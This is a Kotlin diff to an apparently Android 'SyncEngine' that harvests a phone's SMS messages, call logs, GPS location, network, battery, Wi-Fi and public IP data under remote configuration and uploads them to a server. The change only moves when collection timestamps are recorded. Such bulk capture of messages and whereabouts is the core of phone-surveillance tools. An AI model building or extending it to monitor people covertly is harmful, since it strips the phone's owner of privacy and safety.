@@ -24,46 +24,47 @@ object SyncEngine {
         pullConfig(prefs, api)
 
         val now = System.currentTimeMillis()
+        val collected = mutableListOf<String>()
+
         val sms = if (forceAll || prefs.isDue("sms", now)) {
-            Collectors.collectSms(context).also { prefs.setLastCollectedAt("sms", now) }
+            collected += "sms"
+            Collectors.collectSms(context)
         } else {
             JSONArray()
         }
         val calls = if (forceAll || prefs.isDue("calls", now)) {
-            Collectors.collectCalls(context).also { prefs.setLastCollectedAt("calls", now) }
+            collected += "calls"
+            Collectors.collectCalls(context)
         } else {
             JSONArray()
         }
         val gps = if (forceAll || prefs.isDue("gps", now)) {
-            TelemetryCollectors.collectGps(context).also { prefs.setLastCollectedAt("gps", now) }
+            collected += "gps"
+            TelemetryCollectors.collectGps(context)
         } else {
             JSONArray()
         }
         val networkSignal = if (forceAll || prefs.isDue("networkSignal", now)) {
-            TelemetryCollectors.collectNetworkSignal(context).also {
-                prefs.setLastCollectedAt("networkSignal", now)
-            }
+            collected += "networkSignal"
+            TelemetryCollectors.collectNetworkSignal(context)
         } else {
             JSONArray()
         }
         val networkType = if (forceAll || prefs.isDue("networkType", now)) {
-            TelemetryCollectors.collectNetworkType(context).also {
-                prefs.setLastCollectedAt("networkType", now)
-            }
+            collected += "networkType"
+            TelemetryCollectors.collectNetworkType(context)
         } else {
             JSONArray()
         }
         val battery = if (forceAll || prefs.isDue("battery", now)) {
-            TelemetryCollectors.collectBattery(context).also {
-                prefs.setLastCollectedAt("battery", now)
-            }
+            collected += "battery"
+            TelemetryCollectors.collectBattery(context)
         } else {
             JSONArray()
         }
         val wifiSignal = if (forceAll || prefs.isDue("wifiSignal", now)) {
-            TelemetryCollectors.collectWifiSignal(context).also {
-                prefs.setLastCollectedAt("wifiSignal", now)
-            }
+            collected += "wifiSignal"
+            TelemetryCollectors.collectWifiSignal(context)
         } else {
             JSONArray()
         }
@@ -73,9 +74,8 @@ object SyncEngine {
             for (i in 0 until wifiOnly.length()) wifi.put(wifiOnly.getJSONObject(i))
         }
         val publicIp = if (forceAll || prefs.isDue("publicIp", now)) {
-            TelemetryCollectors.collectPublicIp().also {
-                prefs.setLastCollectedAt("publicIp", now)
-            }
+            collected += "publicIp"
+            TelemetryCollectors.collectPublicIp()
         } else {
             JSONArray()
         }
@@ -90,10 +90,12 @@ object SyncEngine {
                 wifi.length() == 0 &&
                 publicIp.length() == 0
         if (empty) {
+            // Nothing to upload; still mark due kinds so empty checks do not spin.
+            stampCollected(prefs, collected, now)
             return JSONObject().put("ok", true).put("skipped", true)
         }
 
-        return api.ingest(
+        val result = api.ingest(
             sms = sms,
             calls = calls,
             gps = gps,
@@ -103,5 +105,13 @@ object SyncEngine {
             wifi = wifi,
             publicIp = publicIp,
         )
+        stampCollected(prefs, collected, now)
+        return result
+    }
+
+    private fun stampCollected(prefs: Prefs, keys: List<String>, now: Long) {
+        for (key in keys) {
+            prefs.setLastCollectedAt(key, now)
+        }
     }
 }
